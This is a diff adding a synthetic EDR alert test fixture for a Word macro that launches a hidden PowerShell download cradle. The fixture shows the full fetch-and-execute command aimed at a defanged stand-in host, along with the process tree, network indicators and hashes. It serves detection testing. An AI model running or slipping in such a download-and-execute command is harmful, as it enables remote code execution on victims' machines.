@@ -1,0 +1,22 @@
+=== EDR ALERT (synthetic test fixture) ===
+Alert ID      : EDR-2026-10-31-0042
+Severity      : High
+Detection     : Suspicious PowerShell download cradle spawned by Office
+Host          : WS-FIN-07 (10.20.30.41)
+User          : CORP\j.doe
+Time (UTC)    : 2026-10-31 08:14:55
+
+Process tree:
+  WINWORD.EXE  "C:\Users\j.doe\Downloads\Invoice_0423.docm"
+  └─ powershell.exe -nop -w hidden -c "(New-Object Net.WebClient).DownloadString('hxxp://update-check[.]example/a.ps1') | IEX"
+     └─ rundll32.exe C:\Users\j.doe\AppData\Local\Temp\payload.exe
+
+Network:
+  10.20.30.41:49712 -> 185.220.101[.]4:443  (TCP, established)
+  DNS query: update-check[.]example -> 185[.]220[.]101[.]4
+  DNS query: cdn-static(.)test
+
+Files:
+  payload.exe   SHA256: 275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f
+                MD5:    44D88612FEA8A8F36DE82E1278ABB02F
+  a.ps1         SHA256: 275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f
